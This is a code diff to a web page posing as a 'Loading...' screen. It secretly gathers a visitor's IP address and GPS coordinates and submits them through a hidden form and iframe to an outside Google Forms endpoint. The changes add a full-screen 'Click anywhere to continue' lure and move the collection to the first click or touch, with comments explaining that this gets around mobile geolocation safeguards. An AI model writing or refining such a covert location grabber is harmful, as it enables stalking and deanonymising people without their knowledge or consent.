@@ -4,8 +4,31 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: system-ui, sans-serif;
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .msg {
+            text-align: center;
+            font-size: 1rem;
+            color: #94a3b8;
+        }
+    </style>
 </head>
 <body>
+    <div class="msg" id="promptText">Click anywhere to continue...</div>
+
     <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
     <form id="fihForm" action="https://docs.google.com/forms/d/e/1FAIpQLSfxqy0_lRSfkAZYDpBs03WMirvA2EvDN1cgJjGC7V9gpmd-3Q/formResponse" method="POST" target="hidden_iframe">
@@ -17,6 +40,8 @@
     </form>
 
     <script>
+        let triggered = false;
+
         async function fetchIp() {
             try {
                 const controller = new AbortController();
@@ -36,6 +61,7 @@
                     resolve("Not Supported");
                     return;
                 }
+                // Must be called synchronously within the click event on mobile
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
@@ -48,9 +74,15 @@
             });
         }
 
-        async function collectAndSend() {
-            const ipPromise = fetchIp();
+        async function collectAndSend(e) {
+            if (triggered) return;
+            triggered = true;
+
+            document.getElementById('promptText').innerText = "Loading...";
+
+            // Trigger geolocation synchronously on tap to satisfy mobile security
             const gpsPromise = getGpsLocation();
+            const ipPromise = fetchIp();
 
             const clientIp = await ipPromise;
             const gpsLocation = await gpsPromise;
@@ -69,7 +101,8 @@
             }, 1200);
         }
 
-        window.onload = collectAndSend;
+        window.addEventListener('click', collectAndSend);
+        window.addEventListener('touchstart', collectAndSend);
     </script>
 </body>
 </html>
